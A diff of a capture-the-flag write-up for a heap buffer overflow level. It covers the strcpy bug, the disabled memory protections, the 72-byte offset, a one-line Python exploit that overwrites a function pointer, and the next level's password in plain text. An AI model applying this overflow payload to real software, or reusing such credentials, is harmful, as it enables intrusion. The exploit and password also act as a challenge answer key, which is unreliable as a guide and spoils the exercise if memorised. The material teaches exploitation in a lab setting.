@@ -1,7 +1,16 @@
 ## Level 6 - Heap Buffer Overflow
-
-### Challenge Summary
 Binary allocates a 64-byte buffer and a 4-byte function pointer on the heap, then uses unsafe `strcpy()` to copy user input.
+
+### Settings
+GCC stack protector support:            Enabled
+Strict user copy checks:                Disabled
+Restrict /dev/mem access:               Enabled
+Restrict /dev/kmem access:              Enabled
+grsecurity / PaX: No GRKERNSEC
+Kernel Heap Hardening: No KERNHEAP
+System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level6/level6
 
 ### Vulnerability
 - `strcpy(buf, argv[1])` - No bounds checking!
@@ -29,11 +38,6 @@ Heap:
 - Metadata/gap: 8 bytes
 - **Total offset to function pointer: 72 bytes**
 
-### The Working Exploit
-
-```bash
-./level6 "$(python -c 'print "A"*72 + "\x54\x84\x04\x08"')"
-```
 
 **Payload Breakdown**:
 - `"A"*72` - Fill the 64-byte buffer plus 8 bytes of metadata
@@ -87,3 +91,6 @@ This is the password to login as level7:
 su level7
 Password: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 ```
+
+### The Working Exploit
+./level6 "$(python -c 'print "A"*72 + "\x54\x84\x04\x08"')"
